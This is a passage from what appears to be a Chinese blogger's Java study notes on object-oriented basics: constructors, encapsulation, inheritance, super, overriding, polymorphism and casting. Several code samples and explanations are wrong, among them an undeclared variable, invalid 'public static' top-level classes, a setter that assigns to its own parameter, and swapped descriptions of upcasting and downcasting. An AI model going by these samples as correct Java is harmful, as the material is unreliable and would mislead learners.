class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void a()&#123;</span><br><span class="line">    b();//报错</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public  void b()&#123;</span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a为静态方法，b为非静态方法的情况下，a没法引用b。b可以引用a</p><h4 id="创建与初始化对象"><a href="#创建与初始化对象" class="headerlink" title="创建与初始化对象"></a>创建与初始化对象</h4><p>使用new关键字创建对象</p><p>使用new关键字创建的时候，出了分配内存空间之外，还会给创建好的对象进项默认的初始化以及对类中构造器的调用。</p><p>类中的构造器也成为了构造方法，是在进行创建爱你对象的时候必须要调用的。并且构造器有以下俩个特点:1.必须和类的名字相同2.必须没有返回类型，也不能写void</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//类：；抽象  实例化</span></span><br><span class="line">        <span class="comment">//类实例化后会返回一个自己的对象</span></span><br><span class="line">        <span class="comment">//student对象就是个Student</span></span><br><span class="line">        Student lzx=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Student ds=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        lll.name=<span class="string">&quot;111;</span></span><br><span class="line"><span class="string">        ds.name=&quot;</span>杜顺<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        lzx.age=99;</span></span><br><span class="line"><span class="string">        ds.age=100;</span></span><br><span class="line"><span class="string">        System.out.println(ds.name+&quot;</span>喜欢<span class="string">&quot;+lll.name);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//属性：字段</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;在学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####构造器详解</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826154923945.png"></p><p>Person文件下明明没有方法，但application下却实例化成功，在生成的class文件下出现了一个方法，<img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826155050161.png"></p><p>使用new关键字，本质是调用构造器</p><p>如果存在了有参构造，无参构造就必须显示构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.NestingKind;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;wawakaka&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//有参构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Person wa=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;1111&quot;</span>);</span><br><span class="line">        System.out.println(wa.name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>alt+insert（我的在f12旁边）快速插入构造器</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826164130590.png" alt="image-20230826164130590"></p><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>该露的露，该藏的藏</p><p>我们程序设计要追求“高内聚，低耦合”。高内聚就是类的内部书记操作细节自己完成，不允许外部干涉；低耦合，仅暴露少量的方法给外部使用。</p><p>封装（数据的隐藏)</p><p>通常，应金制直接访问一个对象中数据的实际表示，而应通过操作接口来访问，这成为信息隐藏</p><p>属性私有，get&#x2F;set</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//属性私有</span></span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id ;<span class="comment">//学号</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">char</span> sex;<span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;<span class="comment">//年龄</span></span><br><span class="line">    <span class="comment">//提供一些可以操作这个属性的方法！</span></span><br><span class="line">    <span class="comment">//听过一些public的一些get/set的方法</span></span><br><span class="line">    <span class="comment">//get获得这个数据</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set 给这个数据设置值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (age&gt;<span class="number">12</span>&amp;&amp;age&lt;<span class="number">24</span>)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            age=<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo04.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setName(<span class="string">&quot;杜顺&quot;</span>);</span><br><span class="line">        s1.setAge(<span class="number">33</span>);</span><br><span class="line">        System.out.println(s1.getAge(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>封装的意义：</p><p>1.提高程序的安全性，保护数据</p><p>2.隐藏代码的实现细节</p><p>3.统一接口</p><p>4.系统了维护增加了</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>继承的本质是对某一批类的抽象，从而实现对现实世界更好的建模。<br>extands的意思是“扩展”。子类是父类的扩展。<br>JAVA中类只有单继承，没有多继承!<br>继承是类和类之间的一种关系。除此之外,类和类之间的关系还有依赖、组合、聚合等。<br>继承关系的俩个类，一个为子类(派生类),一个为父类(基类)。子类继承父类,使用关键字extends来表示。子类和父类之间,从意义上讲应该具有”is a”的关系.<br>object类<br>super</p><p>方法重写</p><p>####Super详解</p><p>application</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.test(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>student</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="comment">//继承了父类，就会拥有父类的全部方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;qingchu&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(name);<span class="comment">//11</span></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);<span class="comment">//qingchu</span></span><br><span class="line">        System.out.println(<span class="built_in">super</span>.name);<span class="comment">//qingchuan</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>person</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="comment">//在Java中，所有的类都直接或者间接继承object类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>   String name=<span class="string">&quot;qingchuan&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>super注意点:</p><ol><li>super调用父类的构造方法，必须在构造方法的第一个2. super 必须只能出现在子类的方法或者构造方法中!3. super和 this 不能同时调用构造方法!<br>vs this:<br>代表的对象不同:<br>this:本身调用者这个对象super:代表父类对象的应用前提<br>this:没哟继承也可以使用<br>super:只能在继承条件才可以使用构造方法<br>this() ;本类的构造super():父类的构造!</li></ol><h4 id="方法重写（子父类之间）"><a href="#方法重写（子父类之间）" class="headerlink" title="方法重写（子父类之间）"></a>方法重写（子父类之间）</h4><p>静态的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.A;</span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//方法的调用之和左边，定义的数据类型</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//父类的引用指向了子类</span></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();<span class="comment">//B</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//重写是方法的重写，与属性无关</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非静态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.A;</span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//方法的调用之和左边，定义的数据类型</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//父类的引用指向了子类</span></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();<span class="comment">//B</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span><span class="comment">//重写   注解：有功能的注释</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//重写是方法的重写，与属性无关</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重写:需要有继承关系，子类重写父类的方法!<br>1．方法名必须相同<br>2. 参数列表列表必须相同<br>3．修饰符:范围可以扩大但不能缩小:public&gt;Protected&gt;Default&gt;private<br>4．抛出的异常:范围，可以被缩小，但不能扩大: classNotFoundException –&gt; Exception(大)<br>重写，子类的方法和父类必要一致:;方法体不同!<br>为什么需要重写:<br>1.父类的功能，子类不一定需要，或者不一定满足!</p><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>即同一个方法可以根据发送对象的不同而采用不同的行为方式</p><p>一个对象的实际类型是确定的，但可以指向对象的引用类型有很多</p><p>多态存在的条件：</p><p>有继承关系</p><p>子类重写父类方法</p><p>父类引用指向子类的对象</p><p>子类重写了父类的方法，输出父类</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829165142028.png"></p><p>子类的set方法，父类却没法调用</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829165424266.png"></p><p>对象能执行那些方法，要看对象左边的类型，右边关系不大</p><p>Student能调用的方法，只能是自己的或者继承来的</p><p>父类Person呢，可以调用自己的方法，没法调用子类独有的方法</p><p>强制类型转换</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829170805535.png"></p><p>注意：1.多态是方法的多态，属性没有多态性</p><p>2.父类和子类：有联系，类型转换异常 ClaCastExeption</p><p>3.存在条件：继承关系，方法需要重写，父类引用指向子类对象  father发 &#x3D;new son()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.oop.Demo06.Person;</span><br><span class="line">import com.oop.Demo06.Student;</span><br><span class="line">import com.oop.Demo06.teacher;</span><br><span class="line"></span><br><span class="line">public class Application &#123;</span><br><span class="line">    public static   void main(String[] args) &#123;</span><br><span class="line">        //object&gt;String</span><br><span class="line">        //object&gt;person&gt;teacher</span><br><span class="line">        //object&gt;person&gt;student</span><br><span class="line"></span><br><span class="line">     Object a1 = new Student();</span><br><span class="line"></span><br><span class="line">        System.out.println(a1 instanceof Student);</span><br><span class="line">        System.out.println(a1 instanceof Person);</span><br><span class="line">        System.out.println(a1 instanceof Object);</span><br><span class="line">        System.out.println(a1 instanceof String);</span><br><span class="line">        System.out.println(a1 instanceof teacher);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能重写：static 方法 属于类 不能实例</p><p>final 常量</p><p>private 私有</p><p>instanceof</p><h4 id="instance-of和类型转换"><a href="#instance-of和类型转换" class="headerlink" title="instance of和类型转换"></a>instance of和类型转换</h4><p>instance of可以判断两个类是否存在父子关系</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829172015598.png"></p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829172723738.png"></p><p>()+要转的对象，alt+回车  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">obj</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Student student= (Student) obj;</span><br><span class="line">        student.go();</span><br></pre></td></tr></table></figure><p>这是低转高的类型，转换没有大问题，子类向父类转换，向上转型</p><p>高转低</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student student= <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.go();</span><br><span class="line">        Person person=student;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>父类转子类会丢失一部分东西，强制转换</p><p>父类引用指向子类对象：向上转型 隐式转换 可能会丢失子类特有的方法 父类引用的变量无法使用子类特有的方法 如果父类引用变量需要使用子类特有的方法，此时需要将该父类引用变量显示转换为子类引用</p><h4 id="static详解"><a href="#static详解" class="headerlink" title="static详解"></a>static详解</h4><figure class="highlight 